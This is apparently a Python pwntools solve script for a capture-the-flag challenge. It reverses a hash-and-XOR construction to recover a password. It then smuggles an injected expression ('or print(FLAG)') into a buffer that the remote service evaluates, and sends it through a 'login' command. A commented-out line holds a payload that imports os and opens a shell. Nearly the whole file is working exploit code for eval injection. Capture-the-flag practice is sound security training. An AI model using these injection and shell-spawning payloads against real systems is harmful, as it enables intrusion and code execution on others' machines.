from pwn import remote, log
import hashlib
def H(b): return hashlib.sha256(b).digest()
def xor(a, b):
    return bytes(x ^ y for x, y in zip(a, b))
def look_up(buf, L=10000):
    for i in range(L):
        try:
            eval(buf[:-32])
            break
        except:
            pass
        xx = xor(H(buf[-32:]), buf[:32])
        buf = xx + xor(H(xx), buf[-32:])
    else:
        raise Exception("Not find anything!")
    return buf


FLAG = b"AAAAAABBBBBBCCCCDDDDD" #  Test
io = remote("heltormalt-1.play.hfsc.tf", 2437)
passwd = bytes.fromhex(io.recvline(0).split(b'/ ')[-1].decode())
log.info(f"{passwd}")
buf = look_up(passwd)
log.info(f"{buf}")
# buf = look_up(buf, 1)
# log.info(f"{buf}")
print(buf[:-32])
# cmd = b',__import__("os").system("sh")'
cmd = b"or print(FLAG)"
buf = buf[:32] + cmd + buf[-32:]
# eval(buf[:-32])

print(buf[:-32])
io.sendlineafter(b">>> ", f"login sus {buf.hex()}".encode())
io.interactive()